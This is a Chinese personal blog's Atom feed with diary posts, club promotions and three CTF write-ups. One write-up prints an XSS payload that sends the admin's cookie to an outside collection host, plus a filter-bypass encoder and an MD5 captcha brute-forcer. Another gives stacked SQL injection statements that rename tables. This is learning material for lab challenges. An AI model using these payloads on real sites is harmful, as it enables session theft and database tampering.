<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://zhangzy999.github.io/</id>
    <title>小张的博客</title>
    <updated>2020-04-28T15:27:27.666Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://zhangzy999.github.io/"/>
    <link rel="self" href="https://zhangzy999.github.io/atom.xml"/>
    <subtitle>我是小张，一个热爱信息安全和记录生活的普通人，一位CTF入门者，编程语言使用者，一位极客追逐者。</subtitle>
    <logo>https://zhangzy999.github.io/images/avatar.png</logo>
    <icon>https://zhangzy999.github.io/favicon.ico</icon>
    <rights>All rights reserved 2020, 小张的博客</rights>
    <entry>
        <title type="html"><![CDATA[日常生活—两个给我很大帮助的大佬的博客地址]]></title>
        <id>https://zhangzy999.github.io/post/dalaoboke/</id>
        <link href="https://zhangzy999.github.io/post/dalaoboke/">
        </link>
        <updated>2020-04-28T15:09:28.000Z</updated>
        <content type="html"><![CDATA[<p>咳咳，第一个就是我的队长，想当年（两个月前），我还是个毛都不会的小屁孩（emm虽然现在也不怎么会），然后在一个比赛群里发现了七星哥哥，他那时候孤身一人参加了高校战疫比赛，拿到了97名我记得，emm虽然他自谦，但是在我这种小白的眼里确实很nb！！<br>
然后他就建立了战队，我就追随大佬的脚步，成了我们队里的第一批队员。<br>
七星很强的！现在开始pwn了已经，<s>每次有大牛的公开课，我们战队全指望他给我们录屏，所以我们战队也叫白嫖工作室</s>下面是他的博客地址，搭的比我好door♂了！<br>
友链：<a href="%22http://qixingnet.top/%22">七星博客</a><br>
我们的白嫖qq群（等你来白嫖，我们一起做白嫖怪）：613455190<br>
<img src="https://zhangzy999.github.io//post-images/1588087082686.png" alt="" loading="lazy"></p>
<p>咳咳，接下来这位大佬，我之前一有问题就奔向他！人也超级好超级帅超级聪明超级谦虚……的无敌堆堆！<br>
一个双修web和pwn的大佬！<br>
看到没，双修web和pwn诶，同是大一生，我望尘莫及555<br>
所以在堆堆大佬的激励下（他总说自己不是大佬，脑壳痛），我准备也双修，emm，不过得是一段时间之后了<br>
堆堆大佬的博客干货满满哟<br>
友链：<a href="%22https://duitutu.cn%22">堆堆的博客</a><br>
<img src="https://zhangzy999.github.io//post-images/1588087482160.png" alt="" loading="lazy"></p>
<p>再次感谢大佬们的倾心相授，信息安全和CTF长路漫漫，终生学习，不断进步。<br>
路在脚下，心在远方。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[日常生活—欢迎加入暗堡高智商俱乐部！]]></title>
        <id>https://zhangzy999.github.io/post/anbao/</id>
        <link href="https://zhangzy999.github.io/post/anbao/">
        </link>
        <updated>2020-04-28T14:52:24.000Z</updated>
        <content type="html"><![CDATA[<p>暗堡高智商俱乐部，是一群沙雕们的世界，是女装大佬们的天堂！<br>
如果你有梦想，如果你有希望，那么就来加入我们吧！<br>
只有你想不到，没有我们做不到，奥力给，每天的水群和抢红包活动，你值得参与<br>
在我们的家庭群里，你能找到各种各样的表情包，能发现各种各样的奇葩人才<br>
心动不如行动，来看看我们的官网，是不是很酷炫吊炸天呢！<br>
<a href="%22http://hiddensite.mysxl.cn/%22">暗堡官网</a><br>
<img src="https://zhangzy999.github.io//post-images/1588085691771.png" alt="" loading="lazy"><br>
我们的证书是不是也很好看高大上嘞，通过免试或者考试，你，将被暗堡收录<br>
在网页上你可以找到你的名字，你还可以拥有自己的证书，奥力给，还等什么<br>
证书如下哟：<br>
<img src="https://zhangzy999.github.io//post-images/1588085849998.png" alt="" loading="lazy"><br>
自此，你有了装逼的资本，你有了无尽的财富，你有了一个会女装的天才会长……<br>
咳咳，跑题了，有意向者前往官网吧，那里有暗堡的联系方式<br>
暗堡<s>低智商</s>高智商协会，等你来战！<br>
<a href="%22http://hiddensite.mysxl.cn/%22">好看的人都点进来了，而丑的人还在犹豫！</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CTF之一道硬核的XSS梦幻联动SQL注入的赛题—[CISCN2019 华东北赛区]Web2]]></title>
        <id>https://zhangzy999.github.io/post/web2-xss/</id>
        <link href="https://zhangzy999.github.io/post/web2-xss/">
        </link>
        <updated>2020-04-28T12:45:18.000Z</updated>
        <content type="html"><![CDATA[<p>文章撰写参考链接，原大佬博客<a href="%22https://www.zhaoj.in/read-6100.html%22"></a><br>
本文是笔者在学习大佬博客基础上写成的(我太菜了)<br>
这道题呢对小白一点儿也不友好<br>
反正我是打了五个小时，最后发现payload没有加引号（骂骂咧咧）<br>
言归正传，我们打开环境，发现是一个网站，有投稿和反馈功能<br>
<img src="https://zhangzy999.github.io//post-images/1588078652213.png" alt="" loading="lazy"><br>
就是说我们可以投稿，然后点击审核，管理员就会来到我们的页面，审核我们的投稿<br>
这样的话我们可以构造恶意代码，让管理员进去，从而窃取管理员的cookie，进入后台为所欲为（滑稽）<br>
好，我们看一下它的投稿页面和审核页面<br>
<img src="https://zhangzy999.github.io//post-images/1588078732024.png" alt="" loading="lazy"><br>
<img src="https://zhangzy999.github.io//post-images/1588078738665.png" alt="" loading="lazy"><br>
嗯，xss没跑了<br>
我们上平台，平台链接是<br>
<a href="http://xss.buuoj.cn/">buu的xss平台</a><br>
你需要注册一个账号，然后新建项目，这块不说了，就跟安装软件一直点下一步一样简单。。。<br>
<img src="https://zhangzy999.github.io//post-images/1588079093914.png" alt="" loading="lazy"><br>
OK，平台会自动帮我们生成xss代码，自己可以研究一下那一摞代码都是干嘛的，很有意思哟<br>
OK，我们回到投稿页面，来一个最简单的脚本实验一下</p>
<pre><code class="language-Javascript">&lt;script&gt;alert(1)&lt;/script&gt;
</code></pre>
<p>提示我们上传成功<br>
<img src="https://zhangzy999.github.io//post-images/1588079347722.png" alt="" loading="lazy"><br>
我们点击那个页面，但是并没有弹窗，我们查看页面源代码，好像发现了不得了的事情<br>
<img src="https://zhangzy999.github.io//post-images/1588079455672.png" alt="" loading="lazy"><br>
没错，我们输入的英文小括号被换成中文的了，说明后端有保护机制，不过虽然头大，我们却可以用markup编码的方式绕过（就是我们喜闻乐见的&amp;#编码）<br>
<img src="https://zhangzy999.github.io//post-images/1588080034916.png" alt="" loading="lazy"><br>
这个编码就是&amp;#后面加上我们的ascii码<br>
链接如下：<a href="https://www.w3.org/MarkUp/html-spec/html-spec_13.html"></a><br>
再看之前的源代码<br>
<img src="https://zhangzy999.github.io//post-images/1588080193440.png" alt="" loading="lazy"><br>
它有个CSP内容安全策略的存在，<a href="https://blog.csdn.net/u014465934/article/details/84199171">CSP内容安全策略详解，在此不再赘述</a><br>
对，它开启了'unsafe-eval'，所以我们可以用eval来执行我们的代码<br>
好，我们的payload为</p>
<pre><code class="language-javascript">&lt;svg&gt;&lt;script&gt;eval(&quot;xss&quot;)&lt;/script&gt;
</code></pre>
<p>而xss就是我们要填充的恶意代码，如下</p>
<pre><code class="language-javascript">(function(){window.location.href=
'http://xss.buuoj.cn/index.php?do=api&amp;id=xpqwIP&amp;keepsession=0&amp;location='
+
escape((function(){try{return document.location.href}catch(e){return''}})())
+
'&amp;toplocation='+escape((function(){try{return top.location.href}catch(e){return''}})())
+
'&amp;cookie='+escape((function(){try{return document.cookie}catch(e){return''}})())
+
'&amp;opener='
+
escape((function(){try{return(window.opener&amp;&amp;window.opener.location.href)
?window.opener.location.href:''}catch(e){return''}})());})();
</code></pre>
<p>注意哈，我是为了大家阅读代码才用换行符分开的，大家中间不要掺杂换行符否则xss不会成功的<br>
<img src="https://zhangzy999.github.io//post-images/1588080785595.png" alt="" loading="lazy"><br>
还有一点，就是上图的id那里要设置成你的项目的id，在项目代码里有<br>
然后接下来我们要做的就是把上述内容给它来个Markup编码，但是手工emm几乎不可能实现除非你是肝帝<br>
接下来上python脚本好了（版本python2.7）</p>
<pre><code class="language-python">payload_end = ''
payload = &quot;(function(){window.location.href='http://xss.buuoj.cn/index.php?do=api&amp;id=xpqwIP&amp;keepsession=0&amp;location='
+escape((function(){try{return document.location.href}catch(e){return''}})())+
'&amp;toplocation='+escape((function(){try{return top.location.href}catch(e){return''}})())
+'&amp;cookie='+escape((function(){try{return document.cookie}catch(e){return''}})())
+'&amp;opener='+escape((function(){try{return(window.opener&amp;&amp;window.opener.location.href)?window.opener.location.href:''}
catch(e){return''}})());})();&quot;
for i in payload:
    payload_end += &quot;&amp;#&quot; + str(ord(i))
payload_final = &quot;&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34&quot; + payload_end + &quot;&amp;#34&amp;#41&lt;/script&gt;&quot;
print payload_final
</code></pre>
<p>同样是便于阅读，再此强调一下哈，中间千万别要换行符，因为换行符会占一个ascii码的......<br>
脚本运行效果如下：<br>
<img src="https://zhangzy999.github.io//post-images/1588081474858.png" alt="" loading="lazy"><br>
再次提醒：前文中我省事儿用的是别的大佬的payload，这个做法可以，但是不要忘记改id哦~<br>
当然......你在你的项目里复制代码最好不过了<br>
然后我们提交这段恶意代码，显示提交成功，这个时候我们的任务已经完成一半了，接下来要做的是反馈页面，然后让管理员访问我们的提交页面从而偷取它的cookie     <s>馋了，想吃曲奇饼干了</s><br>
好，我们进入反馈页面<br>
<img src="https://zhangzy999.github.io//post-images/1588081872289.png" alt="" loading="lazy"><br>
它还需要验证码，给大家附上一个链接，讲的是hash碰撞与生日攻击，蛮有意思的，虽然我没看完（逃）<br>
<a href="https://blog.csdn.net/zl1zl2zl3/article/details/83476069">哈希碰撞与生日攻击学习参考链接</a><br>
好，由于是前六位，我们需要的工作量并不是特别大，最起码我们知道了循环的范围是从6位数开始，额，先到1k我循环试试吧，不过经过我的多次实验发现1kw足够了，下面是碰撞md5的python脚本（python大法好）</p>
<pre><code class="language-python">import hashlib
for x in range(100000,10000000):
    md5_hack = hashlib.md5(str(x)).hexdigest()
    if md5_hack[0:6] == &quot;1d5327&quot; :
        print x
</code></pre>
<p>上述代码中的&quot;1d5327&quot;就是我们反馈的时候提示我们的验证码，我们通过碰撞的方式来得到原来的验证码<br>
经过十几秒最终跑出来了<br>
<img src="https://zhangzy999.github.io//post-images/1588082715077.png" alt="" loading="lazy"><br>
我们输入碰撞得来的密码，提示我们反馈成功<br>
<img src="https://zhangzy999.github.io//post-images/1588082798662.png" alt="" loading="lazy"><br>
OK，我们去平台那里坐等管理员的cookie<br>
<img src="https://zhangzy999.github.io//post-images/1588082880953.png" alt="" loading="lazy"><br>
OK，拿到cookie了，然后开始扫描康康管理员的后台登录界面<br>
很简单，就是admin.php<br>
我们进去之后<br>
发现如下图：<br>
<img src="https://zhangzy999.github.io//post-images/1588082964511.png" alt="" loading="lazy"><br>
提示我们不是管理员，没毛病吧，然后我们通过小插件来输入管理员的cookie，伪造管理员的身份进去就好啦<br>
<img src="https://zhangzy999.github.io//post-images/1588083070484.png" alt="" loading="lazy"><br>
好，我们已经成功进入后台，出现了一个查询框框<br>
<img src="https://zhangzy999.github.io//post-images/1588083098026.png" alt="" loading="lazy"><br>
嗯......sql注入没跑了<br>
这个sql注入是最低级的sql注入了，没有防火墙，sqlmap一把梭即可，或者手工注入也很简单鸭<br>
我直接附上注入的最后结果<br>
<img src="https://zhangzy999.github.io//post-images/1588083277788.png" alt="" loading="lazy"><br>
如果大家对sql注入的赛题感兴趣，请在哔哩哔哩上搜索up主：yuyu-宇<br>
这个是我的主页，我做了很多包括教学视频和刷题视频，都是sql注入方面的<br>
如果文章内容哪里不对，还请哔哩哔哩私信联系我，蟹蟹大家！！</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[日记或者杂七杂八的东东—高数课的"猪猪侠"]]></title>
        <id>https://zhangzy999.github.io/post/zhuzhuxia/</id>
        <link href="https://zhangzy999.github.io/post/zhuzhuxia/">
        </link>
        <updated>2020-04-28T03:20:03.000Z</updated>
        <content type="html"><![CDATA[<p>今天上高数（对，现在正在上）咳咳，老师给我们放了一个歌曲，是小时候我经常看的猪猪侠<br>
555回忆杀</p>
<blockquote>
<p>GGbond，童话里做英雄</p>
</blockquote>
<p>555，小时候真好，无忧无虑对吧<br>
长大了，逐渐懂得就变多了，烦恼也多了，朋友也多了，收获也多了<br>
怎么说<br>
长大这件事，是好的。<br>
长大这件事，也是不好的。<br>
我昨天就开始决定，每天晚上听&quot;舟长&quot;的直播，哔哩哔哩deelmind，那个1w粉丝的up主就是他，很有趣，有点儿像那种古代的隐士大侠一样<br>
怎么说呢，也不太对，反正吧，他给人一种信任感和可靠感<br>
当下社会吧，就是让人感觉还是挺浮躁的，娱乐化就成为一种占据大家眼球的那种感觉<br>
舟长说：&quot;别人的吃喝拉撒不关我事的&quot;，嗯，我觉得太有道理了<br>
舟长说：&quot;做事要有动机，有人可能是为了人类的福祉，不要笑话他，你做不到不代表别人做不到好吧&quot;，嗯，有道理<br>
舟长说：&quot;我一定不会骗你们的，给我几百亿都不会，我觉得这是做人，我应该还算是一个人，所以我有人的底线&quot;，嗯，我相信<br>
所以呢，&quot;猪猪侠&quot;和大人都有好处对吧，有多少人故作高深，或者感伤也好做作也好：&quot;我想回到小时候，那时无忧无虑，岁月静好&quot;<br>
嗯...太浮夸，不过我也没资格评论，因为我本来也是一个浮夸的人<br>
“GGbond，童话里做英雄”<br>
也就大概只能在童话里吧。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CTF-强网杯-“随便注”]]></title>
        <id>https://zhangzy999.github.io/post/suibianzhu/</id>
        <link href="https://zhangzy999.github.io/post/suibianzhu/">
        </link>
        <updated>2020-04-28T00:46:16.000Z</updated>
        <content type="html"><![CDATA[<p>我们打开环境，很简单的一个页面，这emmm<br>
<img src="https://zhangzy999.github.io//post-images/1588035195215.png" alt="" loading="lazy"><br>
大家肯定首先想到了SQL注入，那么其实呢，这道题吧……<br>
没错它就是SQL注入（逃<br>
然后我们输入1，2之类的，发现页面正常回显<br>
在这里我们先不fuzz模糊测试了，对，你还要打开burp，还要加载字典😵（懒）<br>
我们就直接淦吧！！！<br>
对了，插句话，之前一段时间专注于sql注入的学习，然后本博主做了一系列的教学和刷题视频放到了哔哩哔哩上，有mysql的一些知识和极客大挑战中所有的sql注入赛题，哔哩哔哩搜索”yuyu-宇“，带给你不一样的快乐♂<br>
好，言归正传，我们开始验证下是否是sql注入，输入</p>
<pre><code>1' #
</code></pre>
<p>页面能够正常回显，那就没跑了<br>
下面order by干一干<br>
<img src="https://zhangzy999.github.io//post-images/1588037367163.png" alt="" loading="lazy"><br>
2不报错，3就报错了，好，那么select语句里面应该有两个字段<br>
联合查询下康康~<br>
<img src="https://zhangzy999.github.io//post-images/1588037579533.png" alt="" loading="lazy"><br>
<s>mmp过滤了那么多玩意我还怎么玩，溜了溜了</s><br>
好，这个时候既然过滤了select，貌似不可能注入了，不过，等等，<s>愚蠢的</s>开发者的第一个失误，没有过滤分号！（ohhhhh）<br>
堆叠注入来一波试试！</p>
<pre><code class="language-MySql">1';show databases; #
</code></pre>
<p><img src="https://zhangzy999.github.io//post-images/1588038142436.png" alt="" loading="lazy"><br>
very good!<br>
我们继续搞一搞</p>
<pre><code class="language-mysql">1' show tables; #
</code></pre>
<p><img src="https://zhangzy999.github.io//post-images/1588038521819.png" alt="" loading="lazy"><br>
可以看到后端默认查询的数据库有俩表，接下来要用到那么一丢丢小技巧了</p>
<blockquote>
<p>如何用show语句查列嘞？<br>
<code>show columns from 表</code></p>
</blockquote>
<p>所以我们查查这俩表里面都有什么好康的（逐渐猥琐）<br>
先看看那个数字命名的表吧，注意哈，如果表名是数字要加上反引号</p>
<pre><code>';show columns from `1919810931114514`; # 
</code></pre>
<p><img src="https://zhangzy999.github.io//post-images/1588039381912.png" alt="" loading="lazy"><br>
可以看到我们想要的flag字段就在这个表里面，这时候，彷佛我们已经看到了胜利的曙光<br>
OK，我们在看看”words“表里面有啥</p>
<pre><code>';show columns from words; #
</code></pre>
<p><img src="https://zhangzy999.github.io//post-images/1588039674796.png" alt="" loading="lazy"><br>
诶，这个是不是看起来有那么一丢丢熟悉的亚子，没错了，我们一开始查询的时候呢，就是输入id查数据，应该就是在这个表里面查的，现在问题来了，我们想要flag，但是，select又被防火墙干掉了，彷佛是一个无解的题目，但是，<strong>本文最精彩最精彩最精彩的地方来了</strong><br>
笔者见过常规的绕过防火墙保护的姿势，但是看到这个姿势，我当时真的眼前一亮，学到了学到了，果然，做渗透的师傅们的脑洞都很大emm<br>
<strong>用alter和rename把&quot;flag&quot;字段所在的表命名为'words'，给它改成&quot;data&quot;，再把原本的&quot;id&quot;改成别的名字，这样，因为数据库查的是&quot;id&quot;，它可不管&quot;id&quot;里面是啥，他就只认识&quot;id&quot;这个名字，所以我们就理所应当的拿到了flag</strong><br>
最终的攻击语句</p>
<pre><code class="language-mysql">';alter table words rename 小张到此一游;alter table `1919810931114514` rename words;
alter table words change flag id varchar(100);#
</code></pre>
<p>注意，最后一条语句中的words其实是我们的那个flag所在的表，它的名字已经被我们改成words了<br>
然后我们来用万能密码爆flag就可以啦~<br>
<code>' or 1=1 #</code><br>
<img src="https://zhangzy999.github.io//post-images/1588041692949.png" alt="" loading="lazy"><br>
至此，我们已经拿到这个题目的flag了，然后再让我们来康康表名有没有被改（滑稽）<br>
<img src="https://zhangzy999.github.io//post-images/1588041782420.png" alt="" loading="lazy"><br>
很好，如果是真实环境，不知道网站的数据库管理人员看到“小张到此一游”的表情该有多么精彩👻<br>
所以，开发的时候一定要兼顾安全！！尤其是涉及到数据库的安全<br>
<s>我们回到攻击语句那里，甚至可以改下原来的words字段名字，改成 &quot;小张 is my hero&quot;</s><br>
大家有问题可以在哔哩哔哩私信我哟</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[攻防世界web新手区javascript审计-"sample js"]]></title>
        <id>https://zhangzy999.github.io/post/gong-fang-shi-jie-web-xin-shou-qu-gong-lue-yi-lan/</id>
        <link href="https://zhangzy999.github.io/post/gong-fang-shi-jie-web-xin-shou-qu-gong-lue-yi-lan/">
        </link>
        <updated>2020-04-27T03:24:13.000Z</updated>
        <content type="html"><![CDATA[<p>打开环境，浏览器弹出窗口提示我们输入密码<br>
<img src="https://zhangzy999.github.io//post-images/1587959009848.png" alt="" loading="lazy"></p>
<p>我们习惯性的查看页面源码，并且题目已经给我们提示：“simple js”<br>
得到一串js代码，应该是让我们审计js代码没跑了o.o<br>
<img src="https://zhangzy999.github.io//post-images/1587959071008.png" alt="" loading="lazy"></p>
<pre><code class="language-JavaScript">    function dechiffre(pass_enc){           //这一部分是定义了一个函数dechiffre,参数为pass_enc
        var pass = &quot;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&quot;;     //定义了pass字符串
        var tab  = pass_enc.split(',');     //定义了tab变量，其中.split()方法是将一个字符串分割为字符数组，括号里单引号下的逗号是按逗号分割
                var tab2 = pass.split(',');     //tab2变量是对pass字符串进行的分割
                var i,j,k,l=0,m,n,o,p = &quot;&quot;;     // 定义了许多变量，其中未被赋值的变量为undefined
                i = 0;
                j = tab.length;     //.length是返回tab数组的长度，j=36
                k = j + (l) + (n=0);
                n = tab2.length;    // 先定义了n=0，k=18+0+0=18     然后给n赋值n=18
                for(i = (o=0); i &lt; (k = j = n); i++ )       //条件是i=0,i&lt;18(把n的值赋给j，再把j的值赋给k)
                {
                    o = tab[i-l];       //先把tab[i-1]的值赋给o但是我们会发现，后面紧接着有把tab2[i]的值赋给o，这一条语句相当于无用
                    p += String.fromCharCode((o = tab2[i]));    //上面定义了变量p=“”,String.fromCharCode()方法是把Unicode编码转化为字符串
                    if(i == 5)
                        break;        
                 }      // 通过运行此程序段，并且加上document.write(p+”&lt;br/&gt;”);输出p的值我们发现p=FAUX P
                 for(i = (o=0); i &lt; (k = j = n); i++ ){     // 第二个for循环，i=0，i&lt;18,i++ 
                        o = tab[i-l];
                        if(i &gt; 5 &amp;&amp; i &lt; k-1)
                             p += String.fromCharCode((o = tab2[i]));      //该条循环与上个循环相似，最终发现输出的p=FAUX PASSWORD HAH
                        }
        p += String.fromCharCode(tab2[17]);   
        pass = p;
        return pass;    //完整的p是p=p=FAUX PASSWORD HAHA（假的密码哈哈）😢
    }
    //最终函数返回p，但仔细观察我们发现p始终与tab2挂钩，而tab2的值是pass分割成数组的值，pass是定值，也就是说我们函数的参数pass_enc在这个函数里无用！
    String[&quot;fromCharCode&quot;](dechiffre(&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;));
    h = window.prompt('Enter password');
    alert( dechiffre(h) );
</code></pre>
<p>以上我用注释的形式来为大家解释了每一条语句的作用，如果你是比我还萌的萌新，仔细看看肯定是会有收获的（狗头保命）<br>
通过分析我们发现了我们传入的参数p对函数最后返回的结果毫无影响，<strong>因为无论我们输入什么都存到了tab里，而整个函数是对tab2这个数组的操作，无论我们输入什么，最终页面都返回给我们faux password haha</strong>,所以通过分析，那一串16进制的数字转码后应该就是flag了，因为它孤零零的在那里，前不着村后不着店，煞是诡异。。。<br>
所以我们就自己写js代码，把他翻译出来，bingo!<br>
首先我们先把那一串\x的给翻译成ascii，在python中自动完成：<br>
<img src="https://zhangzy999.github.io//post-images/1587970672958.png" alt="" loading="lazy"><br>
然后直接调用fromCharCode方法得到flag</p>
<pre><code class="language-JavaScript">var password = String.fromCharCode(55,56,54,79,115,69,114,116,107,49,50);
console.log(password);
</code></pre>
<p><img src="https://zhangzy999.github.io//post-images/1587971171189.png" alt="" loading="lazy"><br>
以上就是本题的解法，个人认为该题目还是有那么一丢丢难度的（毕竟我js不太好😶）</p>
]]></content>
    </entry>
</feed>